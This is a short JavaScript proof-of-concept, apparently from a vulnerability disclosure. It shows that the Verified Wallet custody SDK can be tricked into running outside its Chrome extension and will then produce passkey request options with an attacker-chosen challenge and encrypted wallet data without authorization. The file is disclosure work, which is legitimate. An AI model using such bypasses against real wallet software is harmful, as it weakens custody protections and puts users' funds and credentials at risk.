/**
 * PoC: Sensitive Custody Data Leakage via SDK
 *
 * This test demonstrates that security‑critical wallet data
 * can be generated and accessed OUTSIDE the Verified Wallet
 * Chrome Extension, without any authorization or custody flow.
 */

const {
  initPlatform,
  publicKeyCredentialRequestOptions,
  encryptString,
} = require("@verified-network/verified-custody");

// 🔥 Step 1: Fake the platform environment
// This tricks the SDK into thinking it's running in a trusted context
initPlatform({
  platform: {
    isWeb: true,
    isReactNative: false,
    isExtension: false, // ← critical
  },
});

console.log("\n🚨 Running Sensitive Data Leakage PoC\n");

// 🔐 Step 2: Generate WebAuthn / Passkey request data
try {
  const options = publicKeyCredentialRequestOptions({
    challenge: "attacker-controlled-challenge",
    rpId: "verified.wallet",
  });

  console.log("✅ Passkey request options generated OUTSIDE extension:");
  console.log(JSON.stringify(options, null, 2));
} catch (e) {
  console.error("❌ Passkey generation failed:", e.message);
}

// 🔓 Step 3: Invoke crypto helper without custody authorization
try {
  const encrypted = encryptString("highly-sensitive-wallet-data");

  console.log("\n✅ Encrypted custody data generated without authorization:");
  console.log(encrypted);

  console.log(
    "\n⚠️ Impact: Cryptographic material can be produced by any SDK consumer,\n" +
    "outside the wallet’s intended custody lifecycle."
  );
} catch (e) {
  console.error("❌ Crypto invocation failed:", e.message);
}
